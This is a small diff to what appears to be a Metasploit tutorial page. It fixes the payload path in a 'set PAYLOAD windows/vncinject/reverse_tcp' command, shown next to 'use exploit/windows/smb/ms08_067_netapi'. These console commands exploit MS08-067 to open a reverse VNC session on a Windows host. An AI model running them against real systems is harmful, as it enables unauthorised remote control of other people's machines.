@@ -43,7 +43,7 @@ use exploit/windows/smb/ms08_067_netapi
 Next we will need to use a payload. A payload is basic software that takes advantage of the exploit. So type
 
 {% highlight ruby %}
-set PAYLOAD /windows/vncinject/reverse_tcp
+set PAYLOAD windows/vncinject/reverse_tcp
 {% endhighlight %}
 
 <b>Setting Up The Attack
